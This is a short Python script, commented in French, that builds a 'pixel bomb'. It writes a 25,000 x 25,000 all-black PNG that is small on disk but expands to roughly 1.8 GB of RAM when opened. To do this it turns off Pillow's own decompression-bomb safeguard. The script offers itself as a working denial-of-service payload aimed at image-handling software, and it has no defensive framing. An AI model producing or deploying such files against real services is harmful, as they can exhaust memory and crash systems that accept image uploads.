from PIL import Image
import os

# On définit une taille gigantesque : 25 000 x 25 000 pixels.
# Calcul en RAM (RGB = 3 octets par pixel) : 25000 * 25000 * 3 = 1.8 Gigaoctets !
WIDTH = 25000
HEIGHT = 25000

print(f"💣 Fabrication de la bombe ({WIDTH}x{HEIGHT} pixels)...")

# 1. On désactive temporairement la propre sécurité de Pillow pour pouvoir la générer
Image.MAX_IMAGE_PIXELS = None 

# 2. On crée une image entièrement noire. 
# Pourquoi noire ? Parce que l'algorithme de compression PNG compresse le vide presque à l'infini.
img = Image.new('RGB', (WIDTH, HEIGHT), color='black')

# 3. On sauvegarde
img.save('pixel_bomb.png')

file_size_kb = os.path.getsize('pixel_bomb.png') / 1024
print(f"✅ Bombe créée avec succès !")
print(f"-> Taille sur le disque : {file_size_kb:.2f} Ko (minuscule !)")
print(f"-> Taille explosive en RAM : ~1.8 Go (Destructeur !)")
